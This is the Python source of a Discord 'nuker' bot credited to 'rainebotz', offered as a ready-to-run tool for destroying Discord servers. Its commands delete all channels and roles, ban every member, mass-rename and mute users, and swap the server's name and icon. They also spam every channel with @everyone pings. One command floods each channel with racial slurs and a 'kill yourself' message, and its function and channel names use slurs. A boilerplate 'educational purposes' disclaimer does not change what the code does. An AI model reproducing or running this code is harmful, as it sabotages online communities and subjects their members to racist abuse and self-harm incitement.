import asyncio
import discord
from discord.ext import commands
import requests
import random

#todo 
#add error handling to all features
#clean the code

TOKEN = 'REPLACE_THIS_WITH_UR_TOKEN' #<----- REPLACE THIS WITH UR TOKEN ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
intents = discord.Intents.default()
intents.members = True
intents.message_content = True  
Error = 'An error occurred'
bot = commands.Bot(command_prefix='!', intents=intents)
serverimage = "https://cdn.discordapp.com/attachments/1237377266237964358/1237397636777115689/images.png?ex=663b7fda&is=663a2e5a&hm=d57d1635be8fec41116521e481394da3a1078501bb6af36907fafb783fe562c6&" 
Message = '@everyone Nuked by @rainebotz | https://discord.gg/UXpPSbHEF8'
ChannelName = 'Niggas nuked by rainebotz'
Version = '1.0 | Last updated 5/7/2024'
Discord = 'https://discord.gg/UXpPSbHEF8'
Github = 'https://github.com/Rainebott'
Info = 'If u find any bugs report them to my discord'
Cmds = '''

Nuker by Rainebotz | Bot prefix (!) | Cmds are listed bellow |
#######################################################################################################
                                    
!executeall     | (⚠️) Attempts to execute all the commands (⚠️) (Some cmds wont execute + its buggy)
!nuke           | Nukes the server
!banall         | Bans all users from the server
!unbanall       | Unbans all banned users
!roleban        | Bans all users with a specific role (Usage:!roleban *Role name*)
!giveroleall    | Gives a role to all the users in the server (Usage !giveroleall *Role name*)
!renameall      | Renames all the users in the server (Usage: !renameall *Name*)
!voice          | Joins and leaves the voice u are in 100 times to annoy the users
!roledel        | Deletes all roles from the server
!nigga          | Bot becomes racist (recommended)
!slowmode       | Puts a slowmode on all channels
!voicemuteall   | Voice mutes all users in the server
!topic          | Sets a topic on all channels
!timeout        | Timeouts all users in the server
!lockdown       | Lockdowns the server
!removelockdown | Removes the lockdown
!delall         | Deletes all the channels 
'''

Terms = '''
⚠️ For educational purposes ⚠️

This program has been created for educational purposes, highlighting the dangers of social engineering.
By using this program, you agree that I am in no way responsible for your usage of this program.
'''


######################################################################################  

@bot.event
async def on_ready():
    print(f"Bot | {bot.user.name}")
    print(Version)
    print(Discord)
    print(Github)
    print(Cmds)
    print(Terms)
    print(Info)

######################################################################################

@bot.command()
async def nuke(ctx):
    try:

        if not (ctx.author.guild_permissions.manage_channels and ctx.author.guild_permissions.manage_guild):
            await ctx.send(Error)
            return

        channels = [channel for channel in ctx.guild.channels if channel != ctx.channel]

        for channel in channels:
            await channel.delete()

        new_channel_names = ["Nuked by @rainebotz"] * 10
        new_channels = []
        tasks = []  

        for name in new_channel_names:
            new_channel = await ctx.guild.create_text_channel(name=name)
            new_channels.append(new_channel)


            message_to_send = (Message)
            if message_to_send:
                task = asyncio.create_task(send_messages(new_channel, message_to_send, 10)) 
                tasks.append(task)

        await ctx.guild.edit(name="@rainebotz") 

        response = requests.get(serverimage)
        response.raise_for_status()    
        image_bytes = response.content
        await ctx.guild.edit(icon=image_bytes)    
    except Exception as e:
        await ctx.send(f"{e}")

        for role in ctx.guild.roles:
            await role.delete()

        for member in ctx.guild.members:
            await member.edit(nick='@Rainebotz')

        if tasks: 
            await asyncio.gather(*tasks)

async def send_messages(channel, message, num_messages):
    for _ in range(num_messages):
        await channel.send(message)
        await asyncio.sleep(0.1) 

######################################################################################  

@bot.command()
async def voice(ctx):

    channel = ctx.author.voice.channel
    if not channel:
        await ctx.send({e})
        return

    try:
        for _ in range(100):  
            voice_client = await channel.connect()
            await asyncio.sleep(0) 
            await voice_client.disconnect()
            await asyncio.sleep(1) 

    except discord.VoiceConnectionError as e:
        print({e})
        await ctx.send({e})
 
######################################################################################  

@bot.command()
async def roledel(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"Deleted all roles | Nuked by @rainebotz | https://discord.gg/UXpPSbHEF8")
        except Exception as e:
            print(Error)

###################################################################################### 

@bot.command()
async def nigga(ctx, times: int = 10):
    tasks = []
    for channel in ctx.guild.channels:
        try:
            task = rape_niggers(channel, times)
            tasks.append(task)
        except Exception as e:
            print(Error)
    await asyncio.gather(*tasks)

async def rape_niggers(channel, times):
    for i in range(times):
        await channel.send("@everyone Kill yourself's niggas | https://discord.gg/UXpPSbHEF8")
        await channel.send("https://media.discordapp.net/attachments/694754728000880642/1017481027230367764/IMG_20220212_192118_688.gif?ex=663b084c&is=6639b6cc&hm=80f3d0f9a7a5cc86e1d64a73a00f71a0ccb562d589c916e97421b44f1cf2508c&")
        await channel.send("https://media.discordapp.net/attachments/944095839914164245/953030912440959107/927B1D18-B118-43DA-ABD8-95A8CE377419.gif?ex=663b3b73&is=6639e9f3&hm=5d83dc9b73cd9b679574cdd826c3b3f809e61ff4f9aa866f6334540e17f84300&")

###################################################################################### 
 
@bot.command()
async def banall(ctx):
    for user in ctx.guild.members:
        try:
            await user.ban(reason="Nuked by @rainebotz | https://discord.gg/UXpPSbHEF8", delete_message_days=7)
        except:
            pass

######################################################################################  

@bot.command()
async def unbanall(ctx):
    banned_users = await ctx.guild.bans()

    for ban_entry in banned_users:
        try:
            await ctx.guild.unban(ban_entry.user)
        except Exception:
            pass

######################################################################################  

@bot.command()
async def roleban(ctx,rolename: discord.Role):
    for role in rolename.members:
        try:
            await role.ban(reason="Nuked by @rainebotz | https://discord.gg/UXpPSbHEF8", delete_message_days=7)
        except:
            pass

###################################################################################### 

@bot.command()
async def renameall(ctx, new_name: str):
    for member in ctx.guild.members:
        await member.edit(nick=new_name)

###################################################################################### 

@bot.command()
async def giveroleall(ctx, role_name: str):
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    for member in ctx.guild.members:
        await member.add_roles(role)

###################################################################################### 

@bot.command()
async def slowmode(ctx, seconds: int):
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.edit(slowmode_delay=seconds)

###################################################################################### 

@bot.command()
async def voicemuteall(ctx):
    for member in ctx.guild.members:
        if member.voice and not member.voice.self_mute:
            await member.edit(mute=True)

###################################################################################### 

@bot.command()
async def topic(ctx):
    topic = "Nuked by @rainebotz | https://discord.gg/UXpPSbHEF8"
    for channel in ctx.guild.channels:
        await channel.edit(topic=topic)

###################################################################################### 

@bot.command()
async def timeout(ctx):
    for member in ctx.guild.members:
        if member.voice and not (member.voice.self_mute and member.voice.self_deaf):
            await member.edit(mute=True, deafen=True)

###################################################################################### 

@bot.command()
async def lockdown(ctx):
    for role in ctx.guild.roles:
        try:
            await role.edit(send_messages=False)
        except Exception:
            pass

###################################################################################### 

@bot.command()
async def removelockdown(ctx):
    for role in ctx.guild.roles:
        try:
            await role.edit(send_messages=True)
        except Exception:
            pass

###################################################################################### 

@bot.command()
async def delall(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass

###################################################################################### 
  
@bot.command()
async def executeall(ctx):
    for command in bot.commands:
        try:
            await command(ctx)
        except Exception:
            continue

######################################################################################  


bot.run(TOKEN)
